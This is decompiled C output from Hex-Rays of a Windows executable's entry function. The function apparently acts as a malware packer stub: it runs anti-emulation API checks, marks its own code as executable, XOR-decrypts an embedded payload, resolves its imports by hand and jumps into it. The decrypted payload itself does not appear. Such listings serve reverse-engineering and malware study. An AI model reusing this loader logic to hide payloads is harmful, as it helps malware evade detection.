/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// PSTR __usercall start@<eax>(int a1@<ebp>);
// BOOL __stdcall AreAllAccessesGranted(DWORD GrantedAccess, DWORD DesiredAccess);
// DWORD __stdcall AddUsersToEncryptedFile(LPCWSTR lpFileName, PENCRYPTION_CERTIFICATE_LIST pEncryptionCertificates);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// PSTR __stdcall StrStrIA(PCSTR pszFirst, PCSTR pszSrch);

//-------------------------------------------------------------------------
// Data declarations

char byte_4015D8[] = { '¿' }; // weak
_UNKNOWN loc_401DB8; // weak
int dword_4028D8[202] =
{
  1908162612,
  -575518083,
  1445889961,
  246663338,
  594444530,
  467942527,
  -1344718021,
  369942135,
  1112372178,
  -377454939,
  1345421645,
  173330344,
  642876848,
  510802351,
  -1426178470,
  315415217,
  1183479575,
  -353927792,
  1401455193,
  188009772,
  670860373,
  528234697,
  -1543028911,
  496096667,
  1240954994,
  -439586091,
  1543802332,
  88326840,
  688163523,
  300496499,
  -1517342251,
  477484078,
  1216051594,
  -463965367,
  1561431282,
  105627712,
  708217305,
  312882459,
  -1503907097,
  532207557,
  1262385742,
  -416976863,
  1581289372,
  116703473,
  720800106,
  308884928,
  -1493880227,
  517789346,
  1252293415,
  -426675790,
  1606848042,
  1011728758,
  271360981,
  681250608,
  -1389545078,
  352181385,
  1082683652,
  -575505515,
  1693037827,
  1011743296,
  271365077,
  681250600,
  -1677129558,
  634514849,
  1908162612,
  -575518035,
  1693037827,
  1011743296,
  271365077,
  681250600,
  -1677129558,
  634514849,
  1908162612,
  -575518035,
  1693037827,
  1011743296,
  271365077,
  681250600,
  -1677129558,
  634514849,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
char byte_404000[4096] =
{
  '”',
  'à',
  '\x1C',
  'Ñ',
  '\r',
  'ê',
  '\x12',
  '}',
  '£',
  '\x15',
  'I',
  'Ä',
  'à',
  'Z',
  'í',
  'œ',
  'u',
  '\x13',
  'Œ',
  '°',
  'ˆ',
  '¯',
  ';',
  'ˆ',
  '\n',
  '¨',
  '©',
  '<',
  '\x01',
  'M',
  'q',
  '…',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // idb


//----- (00401000) --------------------------------------------------------
PSTR __usercall start@<eax>(int a1@<ebp>)
{
  int v1; // edi
  unsigned int v2; // ebx
  PSTR result; // eax
  unsigned int v4; // eax
  unsigned int v5; // ecx
  int *v6; // edx
  char *v7; // edi
  char *v8; // ebp
  char *v9; // esi
  _WORD *v10; // ecx
  char *v11; // ebx
  HMODULE v12; // ecx
  int v13; // ebp
  int v14; // eax
  char *v15; // ebp
  FARPROC v16; // eax
  bool v17; // zf
  DWORD flOldProtect; // [esp+10h] [ebp-10h] BYREF
  char *v20; // [esp+14h] [ebp-Ch]
  HMODULE v21; // [esp+18h] [ebp-8h]
  char *v22; // [esp+1Ch] [ebp-4h]

  v1 = 0;
  v2 = 32;
  result = StrStrIA("StrStrIA", 0);
  if ( !result )
  {
    result = (PSTR)AddUsersToEncryptedFile(0, 0);
    if ( result )
    {
      if ( !AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) )
        v2 = 46;
      v4 = VirtualProtect(start, 0x3000u, 0x40u, &flOldProtect);
      v5 = 0;
      while ( 1 )
      {
        v4 = v2 + 2 * v4;
        if ( v1 == v2 )
          v1 = 0;
        byte_4015D8[v5++] ^= byte_404000[v1++] ^ 0xA0;
        if ( v5 >= 0x1440 )
        {
          v6 = dword_4028D8;
          v7 = &byte_4015D8[-640];
          v8 = 0;
          v22 = &byte_4015D8[-640];
          v9 = &byte_4015D8[-268436096];
          v20 = 0;
          while ( 1 )
          {
            v10 = v6 + 2;
            if ( (unsigned int)(v6[1] - 8) >> 1 )
            {
              v2 = (unsigned int)(v6[1] - 8) >> 1;
              do
              {
                if ( (*v10 & 0xF000) == 12288 )
                  *(_DWORD *)&v7[*v6 + (*v10 & 0xFFF)] += v9;
                ++v10;
                --v2;
              }
              while ( v2 );
              v8 = v20;
            }
            v8 += v6[1];
            v20 = v8;
            v2 += (unsigned int)v9;
            v6 = (int *)((char *)v6 + v6[1]);
            if ( (unsigned int)v8 >= 0xE8 )
            {
              v11 = &byte_4015D8[2796];
              v20 = &byte_4015D8[2796];
              if ( *(_DWORD *)&byte_4015D8[2812] )
              {
                do
                {
                  v12 = LoadLibraryA(&v7[*((_DWORD *)v11 + 3)]);
                  v21 = v12;
                  v9 = &v11[8 * (_DWORD)v9];
                  if ( v12 )
                  {
                    v13 = *(_DWORD *)v11;
                    if ( !*(_DWORD *)v11 )
                      v13 = *((_DWORD *)v11 + 4);
                    v14 = *(_DWORD *)&v7[v13];
                    v15 = &v7[v13];
                    v9 = &v7[*((_DWORD *)v11 + 4)];
                    if ( v14 )
                    {
                      while ( 1 )
                      {
                        if ( v14 >= 0 )
                        {
                          v16 = GetProcAddress(v12, &v7[v14 + 2]);
                        }
                        else
                        {
                          v16 = GetProcAddress(v12, (LPCSTR)*(unsigned __int16 *)v15);
                          v7 = v22;
                        }
                        *(_DWORD *)v9 = v16;
                        v15 += 4;
                        v11 = (char *)(9 * (_DWORD)v11);
                        v14 = *(_DWORD *)v15;
                        v9 += 4;
                        if ( !*(_DWORD *)v15 )
                          break;
                        v12 = v21;
                      }
                      v11 = v20;
                    }
                  }
                  v11 += 20;
                  v17 = *((_DWORD *)v11 + 4) == 0;
                  v20 = v11;
                }
                while ( !v17 );
              }
              ((void (__cdecl *)(int))loc_401DB8)(a1);
              ExitProcess(0);
            }
          }
        }
      }
    }
  }
  return result;
}
// 4028D8: using guessed type int dword_4028D8[202];

// nfuncs=1 queued=1 decompiled=1 lumina nreq=0 worse=0 better=0
// ALL OK, 1 function(s) have been successfully decompiled
